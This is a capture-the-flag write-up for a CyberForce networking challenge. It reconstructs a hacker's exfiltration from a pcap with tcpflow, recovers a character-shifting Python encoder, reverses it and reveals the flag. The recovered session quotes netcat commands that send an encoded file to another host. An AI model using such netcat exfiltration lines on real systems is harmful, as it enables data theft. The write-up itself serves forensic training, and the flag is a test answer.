'19CyberForce Anomaly 49 - Networking
===
[README.txt](./README.txt)
>Our wily hacker does want the snooping admins to see the data content that is being stolen and has used a few tricks to mix things up.
>
>From the pcap file, find the original data content that the hacker exfiltrated. 
>
>Flag is in the "cfc{}" format. 

There was only one file provided, which is [**sneak_exfil_clean.pcapng**](./sneak_exfil_clean.pcapng)
pcapng, which extends the simpler flormat pcap is a Wireshark file, therefore, there must be packages, which were captured over the network.
A tool that analizes network traffic and it captures data over TCP connections is tcpflow.

```
[pasheva]$ tcpflow -d2 -r sneak_exfil_clean.pcapng 
reportfilename: ./report.xml
tcpflow: retrying_open ::open(fn=010.000.000.010.51686-010.000.000.002.01337,oflag=xc2,mask:x1b6)=5
tcpflow: retrying_open ::open(fn=010.000.000.002.01337-010.000.000.010.51686,oflag=xc2,mask:x1b6)=6
tcpflow: retrying_open ::open(fn=010.000.000.010.41820-010.000.000.002.01338,oflag=xc2,mask:x1b6)=7
tcpflow: retrying_open ::open(fn=010.000.000.002.52962-010.000.000.010.01339,oflag=xc2,mask:x1b6)=7
tcpflow: Open FDs at end of processing:      2
tcpflow: demux.max_open_flows:               3
tcpflow: Flow map size at end of processing: 2
tcpflow: Flows seen:                         6
tcpflow: Total flows processed: 6
tcpflow: Total packets processed: 39
```
We do end up with 4 files dumped. We can futher analize what type of files those are.
```
[pasheva]]$ file 010.000.000.002.01337-010.000.000.010.51686
010.000.000.002.01337-010.000.000.010.51686: ASCII text

important.txt
important.txt
wannahide.py
s:  important.txt
my dude, file is ready for exfil
hidden_loot.txt
important.txt
wannahide.py
```

```
[pasheva]$ file 010.000.000.010.41820-010.000.000.002.01338
010.000.000.010.41820-010.000.000.002.01338: Python script, ASCII text executable


#!/usr/bin/python
import sys

ofilename = "hidden_loot.txt"

if len(sys.argv) < 2: 
	print "not enough args"
	exit()

ih = open(sys.argv[1], "r")
oh = open(ofilename, "w")

print "s: ", sys.argv[1]

with open(sys.argv[1]) as ih:
	for line in ih:
		for ch in line:
			oh.write(chr(ord(ch)-0xa))
print "my dude, file is ready for exfil" 

```
```
[pasheva]$ file 010.000.000.002.52962-010.000.000.010.01339
010.000.000.002.52962-010.000.000.010.01339: ASCII text, with no line terminators

Y\Yqm_h;i^WHaIjWhs
```

```
challB]$ file 010.000.000.010.51686-010.000.000.002.01337
010.000.000.010.51686-010.000.000.002.01337: ASCII text

ls
nc -l -p 1338 > wannahide.py
ls
python wannahide.py important.txt
ls
nc -w 3 1339 < hidden_loot.txt
nc -w 3 10.0.0.10 1339 < hidden_loot.txt
```
This porvide us with some information of the structure. We can also see that any input that has been lstened to on port 1338 has been redirected to the python file.
I renamed the string to [important.txt](./010.000.000.002.52962-010.000.000.010.01339) and the python file to [wannahide.py](./010.000.000.010.41820-010.000.000.002.01338)
```
[pasheva]$  python wannahide.py importnat.txt
s:  importnat.txt
Traceback (most recent call last):
  File "wannahide.py", line 19, in <module>
    oh.write(chr(ord(ch)-0xa))
ValueError: chr() arg not in range(0x110000)
```
Every character has been converted to ASCII value and shifted down by 10 so we can do the reverse and shift it up. 
```diff
-oh.write(chr(ord(ch)-0xa))
+oh.write(chr(ord(ch)+0xa))
```
Running again the python file get us the hidde_lost.txt file, which
has the [**flag**](./hidden_loot.txt):
>cfc{wirEshaRkStar}